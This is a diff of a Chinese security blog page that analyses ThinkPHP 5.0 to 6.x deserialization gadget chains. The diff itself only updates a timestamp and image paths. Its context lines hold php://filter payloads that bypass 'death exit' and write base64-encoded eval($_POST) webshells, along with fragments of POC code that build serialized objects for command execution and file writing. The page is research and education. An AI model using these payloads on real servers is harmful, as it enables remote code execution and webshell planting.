@@ -156,7 +156,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-09-18 16:26:54
+          2024-09-19 10:08:30
         </span>
         
               <span class="post-tags">
@@ -222,38 +222,38 @@ $a($b) 变量函数<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <h3 id="一-反序列化链调通过程"><a class="markdownIt-Anchor" href="#一-反序列化链调通过程"></a> 一、反序列化链调通过程</h3>
 <h4 id="1-寻找入口点"><a class="markdownIt-Anchor" href="#1-寻找入口点"></a> 1. 寻找入口点</h4>
 <p>寻找__destruct魔术方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911150823578.png" alt="image-20240911150823578" /></p>
+<p><img src="../../../typora-user-images/image-20240911150823578.png" alt="image-20240911150823578" /></p>
 <h4 id="2-寻找中途的魔术方法"><a class="markdownIt-Anchor" href="#2-寻找中途的魔术方法"></a> 2. 寻找中途的魔术方法</h4>
 <ol>
 <li>跟入removeFiles方法，这里处理$filename变量，unlink会触发toString魔术方法。</li>
 </ol>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151148298.png" alt="image-20240911151148298" /></p>
+<p><img src="../../../typora-user-images/image-20240911151148298.png" alt="image-20240911151148298" /></p>
 <ol start="2">
 <li>寻找可使用的toString方法</li>
 </ol>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151718647.png" alt="image-20240911151718647" /></p>
+<p><img src="../../../typora-user-images/image-20240911151718647.png" alt="image-20240911151718647" /></p>
 <p>跟入toJson方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151808198.png" alt="image-20240911151808198" /></p>
+<p><img src="../../../typora-user-images/image-20240911151808198.png" alt="image-20240911151808198" /></p>
 <p>跟入toArray方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p>
+<p><img src="../../../typora-user-images/2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p>
 <p>912行这里有一个对象调用方法的代码，在找不到对象的方法时，会调用__call魔术方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911153458094.png" alt="image-20240911153458094" /></p>
+<p><img src="../../../typora-user-images/image-20240911153458094.png" alt="image-20240911153458094" /></p>
 <ol start="3">
 <li>寻找可利用的__call魔术方法</li>
 </ol>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154109705.png" alt="image-20240911154109705" /></p>
+<p><img src="../../../typora-user-images/image-20240911154109705.png" alt="image-20240911154109705" /></p>
 <p>跟入block方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154154119.png" alt="image-20240911154154119" /></p>
+<p><img src="../../../typora-user-images/image-20240911154154119.png" alt="image-20240911154154119" /></p>
 <p>跟入writeln方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154238309.png" alt="image-20240911154238309" /></p>
+<p><img src="../../../typora-user-images/image-20240911154238309.png" alt="image-20240911154238309" /></p>
 <p>跟入到write方法，这里可能得到了一个调用任意类的write方法的地方</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154252886.png" alt="image-20240911154252886" /></p>
+<p><img src="../../../typora-user-images/image-20240911154252886.png" alt="image-20240911154252886" /></p>
 <p>这里得到了一个调用任意类的set方法的地方</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154444740.png" alt="image-20240911154444740" /></p>
+<p><img src="../../../typora-user-images/image-20240911154444740.png" alt="image-20240911154444740" /></p>
 <h4 id="3找到最终利用点"><a class="markdownIt-Anchor" href="#3找到最终利用点"></a> 3.找到最终利用点</h4>
 <p>set方法就很熟悉了，我们之前分析命令执行的时候</p>
 <p>\think\cache\driver\File::set</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154651163.png" alt="image-20240911154651163" /></p>
+<p><img src="../../../typora-user-images/image-20240911154651163.png" alt="image-20240911154651163" /></p>
 <p>文件写入的时候，有exit，这个看p牛的文件写入绕死亡exit就行了。</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
 <h4 id="4构造完整利用链"><a class="markdownIt-Anchor" href="#4构造完整利用链"></a> 4.构造完整利用链</h4>
@@ -265,31 +265,31 @@ $a($b) 变量函数<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>A</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">bindAttr参数要不为空，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>modelRelation类要存在getBindAttr方法要有返回值</li>
 <li>不设置data[$key]的值</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911174406671.png" alt="image-20240911174406671" /></p>
+<p><img src="../../../typora-user-images/image-20240911174406671.png" alt="image-20240911174406671" /></p>
 <p>变量赋值对应着右边的三个方法</p>
 <ul>
 <li>第一处parseName方法仅做大小写替换操作，$relation可控</li>
 <li>第二处调用该类自己的方法，这里找到了getError方法，因为方法的返回值是可控的，$modelRelation可控</li>
 <li>第三处调用的方法跟进去，在第一个if逻辑，返回值为this-&gt;parent，可控。</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911175535696.png" alt="image-20240911175535696" /></p>
+<p><img src="../../../typora-user-images/image-20240911175535696.png" alt="image-20240911175535696" /></p>
 <p>分析一下第三处的方法的if逻辑</p>
 <ul>
 <li>第一处返回值可控</li>
 <li>第二处我们需要寻找一个可控的getModel方法的类，在下方的Query类即可找到可控的。</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181833527.png" alt="image-20240911181833527" /></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181623160.png" alt="image-20240911181623160" /></p>
+<p><img src="../../../typora-user-images/image-20240911181833527.png" alt="image-20240911181833527" /></p>
+<p><img src="../../../typora-user-images/image-20240911181623160.png" alt="image-20240911181623160" /></p>
 <p>接下来就是符合Relation子类了，这个类还要有getBindAttr方法</p>
 <p>找到了OneToOne类，同时这里的bindAttr参数也是可控的，这样最开始的逻辑也能进去了。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182518131.png" alt="image-20240911182518131" /></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182354185.png" alt="image-20240911182354185" /></p>
+<p><img src="../../../typora-user-images/image-20240911182518131.png" alt="image-20240911182518131" /></p>
+<p><img src="../../../typora-user-images/image-20240911182354185.png" alt="image-20240911182354185" /></p>
 <p>这下call魔术方法已经可以正常调用到了</p>
 <p>后面的call魔术方法触发set逻辑很简单，没有if之类的逻辑，问题在绕过死亡exit的地方。</p>
 <h3 id="二-死亡exit绕过"><a class="markdownIt-Anchor" href="#二-死亡exit绕过"></a> 二、死亡exit绕过</h3>
 <p>这个在p牛的博客已经写过了，简单来说就是filename可控的时候，使用php://filter伪协议会把content编码处理，这样exit就不会写到文件中了。</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112011325.png" alt="image-20240912112011325" /></p>
+<p><img src="../../../typora-user-images/image-20240912112011325.png" alt="image-20240912112011325" /></p>
 <p>p🐂这里给的例子是函数两个参数均可控的时候，如果filename和content为一个参数时</p>
 <pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
 $content &#x3D; $_GET[content];
@@ -310,11 +310,11 @@ file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidde
 <p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p>
 <p>但这样写，文件名存在特殊字符，Windows下面无法创建文件</p>
 <p>Linux测试一下</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142115389.png" alt="image-20240913142115389" /></p>
+<p><img src="../../../typora-user-images/image-20240913142115389.png" alt="image-20240913142115389" /></p>
 <p>利用跨目录控制文件名。</p>
 <p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../1.php</code></p>
 <p><strong>这个在Windows环境下做测试居然失败了，难道是跨目录的问题？暂时没研究了</strong></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142520525.png" alt="image-20240913142520525" /></p>
+<p><img src="../../../typora-user-images/image-20240913142520525.png" alt="image-20240913142520525" /></p>
 <ol start="3">
 <li>考虑使用其他编码类的过滤器，这样就可以避免=带来的问题了。</li>
 </ol>
@@ -322,26 +322,26 @@ file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidde
 <p>使用rot13凯撒，同时php寻找不到过滤器只会抛出警告，所以我们的payload可以放在过滤器的位置（<strong>但无法在tp中使用，tp会直接抛出异常</strong>）</p>
 <p>最终结果如下：</p>
 <p>如果php不开启短标签的话，前面的&lt;?部分就会被忽略，不会影响解析</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143441913.png" alt="image-20240913143441913" /></p>
+<p><img src="../../../typora-user-images/image-20240913143441913.png" alt="image-20240913143441913" /></p>
 <ol start="4">
 <li>上面的rot13在短标签开启的时候会报错，无法正常使用，可以使用自带的iconv的过滤器</li>
 </ol>
 <p>usc-2过滤器：两位一反转</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143814907.png" alt="image-20240913143814907" /></p>
+<p><img src="../../../typora-user-images/image-20240913143814907.png" alt="image-20240913143814907" /></p>
 <p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=12.php</code></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144253027.png" alt="image-20240913144253027" /></p>
+<p><img src="../../../typora-user-images/image-20240913144253027.png" alt="image-20240913144253027" /></p>
 <p>usc-4过滤器：四位一反转</p>
 <p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144542973.png" alt="image-20240913144542973" /></p>
+<p><img src="../../../typora-user-images/image-20240913144542973.png" alt="image-20240913144542973" /></p>
 <p>UTF编码转换：</p>
 <p>可以把=做编码转换，这样在设置base64解码的时候就不再受到影响了</p>
 <p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913151647177.png" alt="image-20240913151647177" /></p>
+<p><img src="../../../typora-user-images/image-20240913151647177.png" alt="image-20240913151647177" /></p>
 <p>运用到TP上filter的位置就不能放payload了，TP会直接抛出异常，因此需要改一下payload的位置</p>
 <p><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php</code></p>
 <p>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+，正常的base64的payload是这样的，实际情况要根据前面的字符数量，在payload的前面增加字符做填充，这样才能让最终base64解码的时候刚好解码到这个地方。</p>
 <p>看回源码，这里的filename参数是可控的，因此理论上应该可以绕过死亡exit</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112341564.png" alt="image-20240912112341564" /></p>
+<p><img src="../../../typora-user-images/image-20240912112341564.png" alt="image-20240912112341564" /></p>
 <h3 id="三-poc编写"><a class="markdownIt-Anchor" href="#三-poc编写"></a> 三、POC编写</h3>
 <p>写poc注意一下ThinkPHP的命名空间</p>
 <p>Thinkphp命名空间实际上也很好理解，可以理解成一个模块化的定义。A模块的方法调用B模块里面的方法，带着模块名访问初始化就可以了。</p>
@@ -435,12 +435,12 @@ namespace&#123;
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>debug看一下，成功控制filename部分，接下来就是content部分，看一下是否可控了：</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913102139582.png" alt="image-20240913102139582" /></p>
+<p><img src="../../../typora-user-images/image-20240913102139582.png" alt="image-20240913102139582" /></p>
 <p>发现最初调set的时候，参数内容就不可控，写死为了true</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913103110896.png" alt="image-20240913103110896" /></p>
+<p><img src="../../../typora-user-images/image-20240913103110896.png" alt="image-20240913103110896" /></p>
 <p>没办法，只能尝试寻找其他调用set方法的地方，且set方法的参数value部分可控。</p>
 <p>在下面的操作逻辑中，刚好有一处调用set方法的地方，分析一下value参数，发现就是传入的参数，也就是filename。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913104405600.png" alt="image-20240913104405600" /></p>
+<p><img src="../../../typora-user-images/image-20240913104405600.png" alt="image-20240913104405600" /></p>
 <p>因此我们实际上得到了一个filename和content存在相同变量的死亡exit场景。</p>
 <p>这个场景我们上面讨论过了，因此修改一下exp：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -533,8 +533,8 @@ namespace&#123;
 <span class="token punctuation">&#125;</span>
 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>最终效果：</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913153902668.png" alt="image-20240913153902668" /></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913155426725.png" alt="image-20240913155426725" /></p>
+<p><img src="../../../typora-user-images/image-20240913153902668.png" alt="image-20240913153902668" /></p>
+<p><img src="../../../typora-user-images/image-20240913155426725.png" alt="image-20240913155426725" /></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X反序列化利用链.md</a></p>
 <p>这篇blog还提到了如果目录不允许写入文件，通过其他方法创建文件。</p>
 <h3 id="四-其他版本的反序列化链分析"><a class="markdownIt-Anchor" href="#四-其他版本的反序列化链分析"></a> 四、其他版本的反序列化链分析</h3>
@@ -547,27 +547,27 @@ namespace&#123;
 <h3 id="一-反序列化调通过程"><a class="markdownIt-Anchor" href="#一-反序列化调通过程"></a> 一、反序列化调通过程</h3>
 <h4 id="1-入口点"><a class="markdownIt-Anchor" href="#1-入口点"></a> 1. 入口点</h4>
 <p>入口寻找__destruct方法，与TP5.0相同</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135349542.png" alt="image-20240914135349542" /></p>
+<p><img src="../../../typora-user-images/image-20240914135349542.png" alt="image-20240914135349542" /></p>
 <h4 id="2-tostring-魔术方法"><a class="markdownIt-Anchor" href="#2-tostring-魔术方法"></a> 2. ToString 魔术方法</h4>
 <p>依旧是此方法触发tostring</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135424121.png" alt="image-20240914135424121" /></p>
+<p><img src="../../../typora-user-images/image-20240914135424121.png" alt="image-20240914135424121" /></p>
 <h4 id="3-中途利用点"><a class="markdownIt-Anchor" href="#3-中途利用点"></a> 3. 中途利用点</h4>
 <p>这里看一下getAttr方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135839679.png" alt="image-20240914135839679" /></p>
+<p><img src="../../../typora-user-images/image-20240914135839679.png" alt="image-20240914135839679" /></p>
 <p>这里有一处函数变量</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135922286.png" alt="image-20240914135922286" /></p>
+<p><img src="../../../typora-user-images/image-20240914135922286.png" alt="image-20240914135922286" /></p>
 <h4 id="4构造中途条件"><a class="markdownIt-Anchor" href="#4构造中途条件"></a> 4.构造中途条件</h4>
 <p>这条函数方法的pop链的条件很好构造：</p>
 <ol>
 <li>toarray方法的逻辑，可以直接进入，只要赋值data就可以，就可以进入下图中的getAttr方法</li>
 </ol>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154545662.png" alt="image-20240914154545662" /></p>
+<p><img src="../../../typora-user-images/image-20240914154545662.png" alt="image-20240914154545662" /></p>
 <ol start="2">
 <li>if逻辑可以赋值类参数解决，看一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">closure和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">和</span></span></span></span>value的值如何获取即可。</li>
 </ol>
 <p>value是拿的data数组的name键值对应的值</p>
 <p>closure是拿的withAttr数组的name键值对应的值</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154708798.png" alt="image-20240914154708798" /></p>
+<p><img src="../../../typora-user-images/image-20240914154708798.png" alt="image-20240914154708798" /></p>
 <h3 id="二-poc编写"><a class="markdownIt-Anchor" href="#二-poc编写"></a> 二、POC编写</h3>
 <p>写之前注意两个问题：</p>
 <ul>
@@ -602,9 +602,9 @@ namespace&#123;
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>很优美的一条链</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914155309217.png" alt="image-20240914155309217" /></p>
+<p><img src="../../../typora-user-images/image-20240914155309217.png" alt="image-20240914155309217" /></p>
 <p>如果想更实战化一点，我们可以选择调用file_put_contents方法，因为上面也分析过，这里的data也是可控的。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914161202840.png" alt="image-20240914161202840" /></p>
+<p><img src="../../../typora-user-images/image-20240914161202840.png" alt="image-20240914161202840" /></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>
@@ -648,17 +648,17 @@ namespace&#123;
 <p>tp6.0.x网上说低版本可以复用5.1.x后半部分的链接。</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a> 可以看一下这篇文章</p>
 <p>但是本地安装发现，低版本实际上也已经patch过了，因此去找其他链</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174452400.png" alt="image-20240914174452400" /></p>
+<p><img src="../../../typora-user-images/image-20240914174452400.png" alt="image-20240914174452400" /></p>
 <p>后面的链的测试版本6.0.1</p>
 <h3 id="一-反序列化调通过程-2"><a class="markdownIt-Anchor" href="#一-反序列化调通过程-2"></a> 一、反序列化调通过程</h3>
 <p>实际上发现在另一个逻辑上，也可能存在变量函数。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174922818.png" alt="image-20240914174922818" /></p>
+<p><img src="../../../typora-user-images/image-20240914174922818.png" alt="image-20240914174922818" /></p>
 <p>那先找toString方法触发地。</p>
 <h4 id="1寻找tostring方法触发点"><a class="markdownIt-Anchor" href="#1寻找tostring方法触发点"></a> 1.寻找toString方法触发点</h4>
 <p>字符串拼接触发toString方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914180702711.png" alt="image-20240914180702711" /></p>
+<p><img src="../../../typora-user-images/image-20240914180702711.png" alt="image-20240914180702711" /></p>
 <p>触发toString的在此处，上面最后一步的$this-&gt;db()方法。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143311766.png" alt="image-20240918143311766" /></p>
+<p><img src="../../../typora-user-images/image-20240918143311766.png" alt="image-20240918143311766" /></p>
 <h3 id="二-poc编写-2"><a class="markdownIt-Anchor" href="#二-poc编写-2"></a> 二、POC编写</h3>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -697,19 +697,19 @@ namespace&#123;
     <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142310829.png" alt="image-20240918142310829" /></p>
+<p><img src="../../../typora-user-images/image-20240918142310829.png" alt="image-20240918142310829" /></p>
 <h3 id="三-其他反序列化链分析-2"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析-2"></a> 三、其他反序列化链分析</h3>
 <p>分析一下另一个写文件的利用链</p>
 <p>上面分析过_toString的触发，这里找一下toString的其他利用位置：</p>
 <p>下图中的类是可以走到__call方法的</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918100505845.png" alt="image-20240918100505845" /></p>
+<p><img src="../../../typora-user-images/image-20240918100505845.png" alt="image-20240918100505845" /></p>
 <p>__call方法的利用点就多了，继续找一下</p>
 <p>output类可以调用任意类的write方法。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105538579.png" alt="image-20240918105538579" /></p>
+<p><img src="../../../typora-user-images/image-20240918105538579.png" alt="image-20240918105538579" /></p>
 <p>跟入到file类，依旧是任意类的write方法，但是第一个参数已经可控了。第二个参数会是我们上面write传的第一个messages参数。（就是最初触发点的参数）</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105748941.png" alt="image-20240918105748941" /></p>
+<p><img src="../../../typora-user-images/image-20240918105748941.png" alt="image-20240918105748941" /></p>
 <p>接下来继续找两个参数的write方法。file类完美符合要求。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918110305467.png" alt="image-20240918110305467" /></p>
+<p><img src="../../../typora-user-images/image-20240918110305467.png" alt="image-20240918110305467" /></p>
 <pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  
 namespace think\model\concern&#123;  
     trait Attribute&#123;  
@@ -792,15 +792,15 @@ namespace&#123;
 <ul>
 <li>命令执行</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142423600.png" alt="image-20240918142423600" /></p>
+<p><img src="../../../typora-user-images/image-20240918142423600.png" alt="image-20240918142423600" /></p>
 <ul>
 <li>
 <p>写文件</p>
 <p>6.1 版本默认不携带Flysytem类，导致上面分析的写文件链无法再次使用。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143955561.png" alt="image-20240918143955561" /></p>
+<p><img src="../../../typora-user-images/image-20240918143955561.png" alt="image-20240918143955561" /></p>
 </li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143857435.png" alt="image-20240918143857435" /></p>
+<p><img src="../../../typora-user-images/image-20240918143857435.png" alt="image-20240918143857435" /></p>
 <h2 id="6thinkphp80x反序列化"><a class="markdownIt-Anchor" href="#6thinkphp80x反序列化"></a> ⑥ThinkPHP8.0.x反序列化</h2>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14904">https://xz.aliyun.com/t/14904</a></p>
 <p>暂时不自己分析了，可以看一下这篇文章，其实上面分析了这么多条链。自己挖掘也就很简单了</p>
@@ -819,14 +819,14 @@ namespace&#123;
 <h2 id="原生反序列化"><a class="markdownIt-Anchor" href="#原生反序列化"></a> 原生反序列化</h2>
 <p>字面意思</p>
